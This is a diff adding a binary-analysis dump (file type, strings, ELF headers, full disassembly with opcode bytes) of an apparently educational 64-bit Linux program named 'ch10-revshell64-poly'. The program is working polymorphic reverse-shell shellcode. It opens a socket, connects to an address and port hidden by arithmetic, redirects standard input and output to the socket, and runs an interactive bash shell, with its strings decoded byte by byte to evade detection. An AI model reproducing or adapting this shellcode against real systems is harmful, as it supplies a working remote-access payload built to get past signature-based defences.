@@ -1,0 +1,191 @@
+*** FILE TYPE INFORMATION ***
+
+ch10-revshell64-poly: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
+
+
+*** STRINGS INFORMATION ***
+
+0000cbtiSM1  |  [SM1  |  .....ahmAWI  |  A_AWH  |  Pfh,hf  |  PVWH  |  ch10-revshell64-poly.nasm  |  conL  |  bshL  |  exLp  |  __bss_start  |  _edata  |  _end  |  .symtab  |  .strtab  |  .shstrtab  |  .text  |  
+
+*** READELF ALL ***
+
+ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x400080
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          776 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         1
+  Size of section headers:           64 (bytes)
+  Number of section headers:         5
+  Section header string table index: 2
+
+Section Headers:
+  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0
+  [ 1] .text             PROGBITS        0000000000400080 000080 000114 00  AX  0   0 16
+  [ 2] .shstrtab         STRTAB          0000000000000000 0002e6 000021 00      0   0  1
+  [ 3] .symtab           SYMTAB          0000000000000000 000198 000108 18      4   7  8
+  [ 4] .strtab           STRTAB          0000000000000000 0002a0 000046 00      0   0  1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
+  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
+  O (extra OS processing required) o (OS specific), p (processor specific)
+
+There are no section groups in this file.
+
+Program Headers:
+  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
+  LOAD           0x000000 0x0000000000400000 0x0000000000400000 0x000194 0x000194 R E 0x200000
+
+ Section to Segment mapping:
+  Segment Sections...
+   00     .text 
+
+There is no dynamic section in this file.
+
+There are no relocations in this file.
+
+The decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not currently supported.
+
+Symbol table '.symtab' contains 11 entries:
+   Num:    Value          Size Type    Bind   Vis      Ndx Name
+     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 0000000000400080     0 SECTION LOCAL  DEFAULT    1 
+     2: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS ch10-revshell64-poly.nasm
+     3: 00000000004000f7     0 NOTYPE  LOCAL  DEFAULT    1 conL
+     4: 000000000040013e     0 NOTYPE  LOCAL  DEFAULT    1 bnL
+     5: 000000000040015f     0 NOTYPE  LOCAL  DEFAULT    1 bshL
+     6: 000000000040018d     0 NOTYPE  LOCAL  DEFAULT    1 exLp
+     7: 0000000000400080     0 NOTYPE  GLOBAL DEFAULT    1 _start
+     8: 0000000000600194     0 NOTYPE  GLOBAL DEFAULT    1 __bss_start
+     9: 0000000000600194     0 NOTYPE  GLOBAL DEFAULT    1 _edata
+    10: 0000000000600198     0 NOTYPE  GLOBAL DEFAULT    1 _end
+
+No version information found in this file.
+
+
+*** OBJDUMP EXECUTABLE ***
+
+
+ch10-revshell64-poly:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080:	48 89 c3             	mov    rbx,rax
+  400083:	48 31 d8             	xor    rax,rbx
+  400086:	49 89 f2             	mov    r10,rsi
+  400089:	49 89 f9             	mov    r9,rdi
+  40008c:	4c 31 d6             	xor    rsi,r10
+  40008f:	4c 31 cf             	xor    rdi,r9
+  400092:	48 ff c6             	inc    rsi
+  400095:	40 fe c7             	inc    dil
+  400098:	40 fe c7             	inc    dil
+  40009b:	b0 2a                	mov    al,0x2a
+  40009d:	fe c8                	dec    al
+  40009f:	0f 05                	syscall 
+  4000a1:	4d 31 c0             	xor    r8,r8
+  4000a4:	49 89 c0             	mov    r8,rax
+  4000a7:	48 89 c3             	mov    rbx,rax
+  4000aa:	48 31 d8             	xor    rax,rbx
+  4000ad:	c7 44 24 fc 8a 11 11 	mov    DWORD PTR [rsp-0x4],0x1111118a
+  4000b4:	11 
+  4000b5:	81 6c 24 fc 0b 10 10 	sub    DWORD PTR [rsp-0x4],0x1010100b
+  4000bc:	10 
+  4000bd:	66 c7 44 24 fa 79 68 	mov    WORD PTR [rsp-0x6],0x6879
+  4000c4:	66 81 44 24 fa 01 01 	add    WORD PTR [rsp-0x6],0x101
+  4000cb:	89 44 24 f6          	mov    DWORD PTR [rsp-0xa],eax
+  4000cf:	c6 44 24 f8 01       	mov    BYTE PTR [rsp-0x8],0x1
+  4000d4:	fe 44 24 f8          	inc    BYTE PTR [rsp-0x8]
+  4000d8:	48 83 ec 08          	sub    rsp,0x8
+  4000dc:	48 31 c0             	xor    rax,rax
+  4000df:	b0 2c                	mov    al,0x2c
+  4000e1:	fe c8                	dec    al
+  4000e3:	fe c8                	dec    al
+  4000e5:	48 89 e6             	mov    rsi,rsp
+  4000e8:	48 31 d2             	xor    rdx,rdx
+  4000eb:	48 31 ff             	xor    rdi,rdi
+  4000ee:	4c 89 c7             	mov    rdi,r8
+  4000f1:	48 31 c9             	xor    rcx,rcx
+  4000f4:	80 c1 10             	add    cl,0x10
+
+00000000004000f7 <conL>:
+  4000f7:	fe c2                	inc    dl
+  4000f9:	e2 fc                	loop   4000f7 <conL>
+  4000fb:	0f 05                	syscall 
+  4000fd:	48 31 c0             	xor    rax,rax
+  400100:	b0 21                	mov    al,0x21
+  400102:	48 31 f6             	xor    rsi,rsi
+  400105:	48 ff c6             	inc    rsi
+  400108:	48 ff c6             	inc    rsi
+  40010b:	0f 05                	syscall 
+  40010d:	48 31 c0             	xor    rax,rax
+  400110:	b0 21                	mov    al,0x21
+  400112:	48 ff ce             	dec    rsi
+  400115:	0f 05                	syscall 
+  400117:	48 31 c0             	xor    rax,rax
+  40011a:	b0 21                	mov    al,0x21
+  40011c:	48 ff ce             	dec    rsi
+  40011f:	0f 05                	syscall 
+  400121:	48 31 c0             	xor    rax,rax
+  400124:	50                   	push   rax
+  400125:	48 31 db             	xor    rbx,rbx
+  400128:	48 bb 30 30 30 30 63 	movabs rbx,0x6974626330303030
+  40012f:	62 74 69 
+  400132:	53                   	push   rbx
+  400133:	4d 31 d2             	xor    r10,r10
+  400136:	49 89 e2             	mov    r10,rsp
+  400139:	48 31 c9             	xor    rcx,rcx
+  40013c:	b1 08                	mov    cl,0x8
+
+000000000040013e <bnL>:
+  40013e:	41 fe 0a             	dec    BYTE PTR [r10]
+  400141:	49 ff c2             	inc    r10
+  400144:	e2 f8                	loop   40013e <bnL>
+  400146:	5b                   	pop    rbx
+  400147:	53                   	push   rbx
+  400148:	4d 31 ff             	xor    r15,r15
+  40014b:	49 bf 2e 2e 2e 2e 2e 	movabs r15,0x6d68612e2e2e2e2e
+  400152:	61 68 6d 
+  400155:	41 57                	push   r15
+  400157:	49 89 e2             	mov    r10,rsp
+  40015a:	48 31 c9             	xor    rcx,rcx
+  40015d:	b1 08                	mov    cl,0x8
+
+000000000040015f <bshL>:
+  40015f:	41 fe 02             	inc    BYTE PTR [r10]
+  400162:	49 ff c2             	inc    r10
+  400165:	e2 f8                	loop   40015f <bshL>
+  400167:	41 5f                	pop    r15
+  400169:	41 57                	push   r15
+  40016b:	48 89 e7             	mov    rdi,rsp
+  40016e:	50                   	push   rax
+  40016f:	66 68 2c 68          	pushw  0x682c
+  400173:	66 81 04 24 01 01    	add    WORD PTR [rsp],0x101
+  400179:	48 89 e6             	mov    rsi,rsp
+  40017c:	50                   	push   rax
+  40017d:	56                   	push   rsi
+  40017e:	57                   	push   rdi
+  40017f:	48 89 e6             	mov    rsi,rsp
+  400182:	48 31 d2             	xor    rdx,rdx
+  400185:	48 31 c9             	xor    rcx,rcx
+  400188:	b9 3b 00 00 00       	mov    ecx,0x3b
+
+000000000040018d <exLp>:
+  40018d:	48 ff c0             	inc    rax
+  400190:	e2 fb                	loop   40018d <exLp>
+  400192:	0f 05                	syscall 
+
+
